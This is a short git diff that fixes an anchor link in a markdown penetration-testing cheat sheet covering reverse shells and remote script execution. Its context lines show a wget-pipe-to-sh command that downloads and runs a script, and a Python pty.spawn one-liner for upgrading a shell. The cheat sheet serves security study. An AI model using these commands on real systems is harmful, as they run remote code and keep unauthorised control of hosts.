@@ -17,7 +17,7 @@
 - [Maintaining control](#maintain)
     - [Reverse Shell](#rev_shell)
     - [Execute a Remote Script](#remote_script)
-    - [TTY]
+    - [TTY](#TTY)
 
 
 
@@ -346,6 +346,7 @@ Starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-
 `wget http://server/file.sh -O- | sh`  
 This command forces the download of a file and immediately its execution
 
+<a name="TTY"/><a>
 ### TTY Shell
 
 `python -c 'import pty;pty.spawn("/bin/bash")'`
